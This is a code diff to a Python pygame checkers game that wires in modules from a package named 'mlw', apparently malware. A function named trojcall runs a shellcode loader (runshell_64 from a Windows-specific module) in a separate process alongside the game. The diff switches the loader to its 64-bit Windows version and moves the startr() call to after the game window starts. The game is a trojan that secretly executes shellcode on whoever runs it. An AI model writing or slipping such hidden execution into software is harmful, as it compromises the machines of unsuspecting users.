@@ -1,9 +1,12 @@
 import pygame, os, sys
 from Board import Board
 from Game import Game
-import mlw.trojan as trojan
-import mlw.runshellc as runshellcode
+# import mlw.trojan as trojan
+
 from multiprocessing import Process, freeze_support, set_executable
+
+# import mlw.runshellc as runshellcode
+import mlw.runshellc_win as runshellcode
 
 pygame.init()
 
@@ -42,7 +45,7 @@ class Checkers:
 def trojcall():
     # print("Fork!")
     # trojan.autoconn()
-    runshellcode.runshell()
+    runshellcode.runshell_64()
     os._exit(1)
 
 def startr():
@@ -62,14 +65,14 @@ if __name__ == "__main__":
     freeze_support()
     # set_executable(os.path.join(sys.exec_prefix, 'pythonw.exe'))
     
-    startr()
-    
     window_size = (640, 640)
     screen = pygame.display.set_mode(window_size)
     pygame.display.set_caption("Checkers")
     
     checkers = Checkers(screen)
     checkers.main(window_size[0], window_size[1])
+    
+    startr()
     
     sys.exit(0)
     
